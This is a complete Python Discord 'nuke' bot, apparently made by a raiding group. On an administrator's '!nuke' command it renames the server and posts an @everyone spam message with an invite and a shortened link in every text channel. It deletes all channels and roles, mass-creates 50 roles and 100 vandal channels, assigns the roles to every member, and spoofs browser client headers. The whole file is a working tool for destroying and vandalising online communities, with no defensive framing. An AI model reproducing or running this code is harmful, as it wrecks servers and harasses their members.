import asyncio
import aiohttp
import discord
import logging


TOKEN = ""

NEW_SERVER_NAME = "M:p植民地"

ROLE_NAME = "Mp万歳 gg5ch"
ROLE_COLOR = 15548997
ROLE_COUNT = 50

CHANNEL_NAME = "gg5ch-このサーバーはmpにより破壊された"
CHANNEL_COUNT = 100

SPAM_MESSAGE = """
@everyone 
# M:p万歳
## このサーバーはM:pにより破壊されました:joy: 
## らぷろむ主席万歳     ぱすた万歳
discord.gg/5ch
https://x.gd/SVod3
"""

logging.getLogger('discord').setLevel(logging.CRITICAL)

intents = discord.Intents.all()
client = discord.Client(intents=intents)

API_BASE = "https://discord.com/api/v10"


def make_headers(token):
    return {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0OS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQ5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjU3MzQxMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImYzNjAzOGZmLTlmMTAtNDg0Ni1iMTQyLTM4Zjk5YTA2N2IyNiIsImxhdW5jaF9zaWduYXR1cmUiOiIyYzA3NDc2MC1iMDE2LTQ1YWAbODczNi1lZTM5YzQzOGI0MWYiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6Ijk5NjhlMTI0LTQ3NGQtNDc3Zi04ODY2LWRmMGYxMWI5NzJlOSJ9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "ja,en-US;q=0.9,en;q=0.8"
    }


async def api_delete(session, url, headers):
    async with session.delete(url, headers=headers) as resp:
        return resp.status


async def api_post(session, url, headers, json=None):
    async with session.post(url, headers=headers, json=json) as resp:
        if resp.status in (200, 201):
            data = await resp.json()
            return data.get("id")
        return None


async def api_patch(session, url, headers, json=None):
    async with session.patch(url, headers=headers, json=json) as resp:
        return resp.status


async def api_put(session, url, headers):
    async with session.put(url, headers=headers) as resp:
        return resp.status


async def do_nuke(guild):
    guild_id = guild.id
    token = TOKEN
    headers = make_headers(token)

    ch_ids = [ch.id for ch in guild.channels]
    txt_ids = [ch.id for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
    role_ids = [r.id for r in guild.roles if r.id != guild_id and not r.managed and r < guild.me.top_role]
    m_ids = [m.id for m in guild.members if not m.bot]

    async with aiohttp.ClientSession() as session:
        burst_tasks = []

        if NEW_SERVER_NAME:
            burst_tasks.append(
                api_patch(session, f"{API_BASE}/guilds/{guild_id}", headers, {"name": NEW_SERVER_NAME})
            )

        for cid in txt_ids:
            burst_tasks.append(
                api_post(session, f"{API_BASE}/channels/{cid}/messages", headers, {"content": SPAM_MESSAGE})
            )

        for rid in role_ids:
            burst_tasks.append(
                api_delete(session, f"{API_BASE}/guilds/{guild_id}/roles/{rid}", headers)
            )

        for cid in ch_ids:
            burst_tasks.append(
                api_delete(session, f"{API_BASE}/channels/{cid}", headers)
            )

        await asyncio.gather(*burst_tasks, return_exceptions=True)

        create_tasks = []

        for i in range(ROLE_COUNT):
            create_tasks.append(
                api_post(session, f"{API_BASE}/guilds/{guild_id}/roles", headers, {
                    "name": f"{ROLE_NAME}-{i}" if ROLE_COUNT > 1 else ROLE_NAME,
                    "permissions": "0",
                    "color": ROLE_COLOR,
                    "hoist": True,
                })
            )

        for i in range(CHANNEL_COUNT):
            create_tasks.append(
                api_post(session, f"{API_BASE}/guilds/{guild_id}/channels", headers, {
                    "name": f"{CHANNEL_NAME}-{i}" if CHANNEL_COUNT > 1 else CHANNEL_NAME,
                    "type": 0,
                })
            )

        results = await asyncio.gather(*create_tasks, return_exceptions=True)

        new_role_ids = [r for r in results[:ROLE_COUNT] if isinstance(r, str)]
        new_channel_ids = [c for c in results[ROLE_COUNT:] if isinstance(c, str)]

        final_tasks = []

        for rid in new_role_ids:
            for mid in m_ids:
                final_tasks.append(
                    api_put(session, f"{API_BASE}/guilds/{guild_id}/members/{mid}/roles/{rid}", headers)
                )

        await asyncio.gather(*final_tasks, return_exceptions=True)


@client.event
async def on_ready():
    pass


@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.strip() != "!nuke":
        return

    if message.guild is None:
        return

    perms = message.author.guild_permissions
    if not perms or not perms.administrator:
        return

    try:
        await message.delete()
    except:
        pass

    await do_nuke(message.guild)


client.run(TOKEN)
